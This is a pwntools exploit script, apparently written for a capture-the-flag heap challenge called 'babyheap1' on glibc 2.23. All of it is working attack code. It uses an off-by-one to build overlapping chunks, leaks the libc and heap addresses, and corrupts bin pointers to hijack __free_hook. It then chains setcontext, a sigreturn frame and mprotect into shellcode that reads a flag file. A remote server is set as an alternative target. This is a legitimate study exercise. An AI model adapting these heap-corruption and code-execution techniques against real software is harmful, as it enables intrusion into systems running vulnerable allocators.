#! /usr/bin/env python3
from pwn import *

arch = 64
challenge = './babyheap1'

context.os='linux'
context.log_level = 'debug'
if arch==64:
    context.arch='amd64'
if arch==32:
    context.arch='i386'
context.terminal = ['tmux', 'splitw', '-h']
elf = ELF(challenge)
libc = ELF('libc-2.23.so')

local = 1
if local:
    p = process(challenge)
else:
    p = remote('chuj.top', '53178')


def debug():
    gdb.attach(p)
    pause()

bps = [0xD59,0xE2C]
pie = 1
def gdba():
    if local == 0:
        return 0
    cmd ='set follow-fork-mode parent\n'
    #cmd=''
    if pie:
        base = int(os.popen("pmap {}|awk '{{print $1}}'".format(p.pid)).readlines()[1],16)
        cmd += ''.join(['b *{:#x}\n'.format(b+base) for b in bps])
        cmd += 'set $base={:#x}\n'.format(base)
    else:
        cmd+=''.join(['b *{:#x}\n'.format(b) for b in bps])

    gdb.attach(p,cmd)

def eat():
    p.recvuntil('oice: \n')

def create(size):
    eat()
    p.sendline('1')
    p.recvuntil('Size: ')
    p.sendline(str(size))

def edit(index, content):
    eat()
    p.sendline('2')
    p.recvuntil('Index: ')
    p.sendline(str(index))
    p.recvuntil('Content: ')
    p.send(content)

def delete(index):
    eat()
    p.sendline('3')
    p.recvuntil('Index: ')
    p.sendline(str(index))

def show(index):
    eat()
    p.sendline('4')
    p.recvuntil('Index: ')
    p.sendline(str(index))


while True:
    arch = 64
    challenge = './babyheap1'

    context.os = 'linux'
    context.log_level = 'debug'
    if arch == 64:
        context.arch = 'amd64'
    if arch == 32:
        context.arch = 'i386'
    context.terminal = ['tmux', 'splitw', '-h']
    elf = ELF(challenge)
    libc = ELF('libc-2.23.so')

    local = 1
    if local:
        p = process(challenge)
    else:
        p = remote('chuj.top', '53178')

    # 堆布局
    create(0x18)  # 0
    create(0x508)  # 1
    create(0x18)  # 2

    create(0x18)  # 3
    create(0x508)  # 4
    create(0x18)  # 5

    create(0x18)  # 6
    create(0x4d8)  # 7
    create(0x18)  # 8

    create(0x18)  # 9

    edit(1, 0x4f0 * b'a' + p64(0x500))  # 伪造 prve_size 为 0x500
    delete(1)  # 被覆盖的 prev_size 恢复
    edit(0, (0x18) * b'a')  # off-by-one 伪造 size 为 0x500

    # 2 overlap 10，通过 10 能改 2
    # 顺便 用 unlink 泄露libc
    create(0x18)  # 1
    create(0x4d8)  # 10 uaf overlap
    
    delete(1)  # 使 prev_size 为 0x20，不然报 corrupted size vs. prev_size
    delete(2)  # unlink

    create(0x18)  # 1
    show(10)
    unsorted_addr = (u64(p.recvuntil(b'\x7f')[-6:].ljust(8, b'\x00')))
    libc.address = unsorted_addr - 0x3c4b78
    log.success('libc.address: ' + hex(libc.address))
    delete(1)

    create(0x38)  # 1
    create(0x4e0)  # 2 0x4f0 unsorted

    # ? overlap 11，通过 11 能改 free块
    edit(4, 0x4f0 * b'a' + p64(0x500))
    delete(4)  # 被覆盖的 prev_size 恢复
    edit(3, (0x18) * b'a')

    create(0x18)  # 4
    create(0x4d8)  # 11 uaf overlap

    delete(4)
    delete(5)  # unlink
    create(0x18)  # 4

    delete(1)
    delete(2)
    
    create(0x508)  # 1
    create(0x18)  # 2
    
    delete(1)
    
    show(11)
    heap_base = u64(p.recvuntil('\n', drop='True').ljust(8, b'\x00')) - 0x40
    log.success('heap_base: ' + hex(heap_base))

    delete(4)
    # delete(1)
    delete(2)
    
    create(0x38)  # 1
    create(0x4e0)  # 2
    # 0x4f0 unsorted
    create(0x48)  # 4
    # 0x4e0 large

    # 放入 large_bin 和 unsorted_bin
    delete(2)
    create(0x4e0)  # 2
    delete(2)

    free_hook = libc.sym['__free_hook']
    log.success('free_hook: ' + hex(free_hook))
    mprotect_addr = libc.symbols['mprotect']
    log.success('mprotect_addr: ' + hex(mprotect_addr))
    setcontext_addr = libc.symbols['setcontext']
    log.success('setcontext_addr: ' + hex(setcontext_addr))
    # leak_heap_base
    # create(0x18)# 1

    # 开始伪造
    evil = free_hook - 0x10
    unsorted = p64(0) * 2 + p64(0) + p64(0x4f1) + p64(0) + p64(evil) + p64(0) + p64(0)
    edit(10, unsorted)  # unsorted 伪造 bk

    large = p64(0) * 4 + p64(0) + p64(0x4e1) + p64(0) + p64(evil + 0x8) + p64(0) + p64(evil - 0x20 + 8 - 5)
    edit(11, large)  # large 伪造 bk_nextsize bk
    try:
        create(0x48)  # 2

        shellcode = asm(shellcraft.open("./flag", 0))
        shellcode += asm(shellcraft.read(3, heap_base + 0x10, 0x30))
        shellcode += asm(shellcraft.write(1, heap_base + 0x10, 0x30))

        heap_addr = heap_base + 0xac0 + 0x10  ## store sigreturn frame and shellcode, fake stack
        log.success('heap_addr: ' + hex(heap_addr))
        frame = SigreturnFrame()

        frame.rdi = heap_base & 0xfffffffffffff000
        frame.rsi = 0x1000
        frame.rdx = 7

        frame.rip = mprotect_addr
        frame.rsp = heap_addr + len(bytes(frame))
        # payload = str(frame)
        print(len(bytes(frame)))
        payload = bytes(frame) + p64(heap_addr + len(bytes(frame)) + 8) + shellcode

        edit(7, payload + b'\n')

        edit(2, p64(setcontext_addr + 53)[:-2] + b'\n')

        delete(7)

    except EOFError:
        p.close()
        continue
    else:
        p.interactive()
        break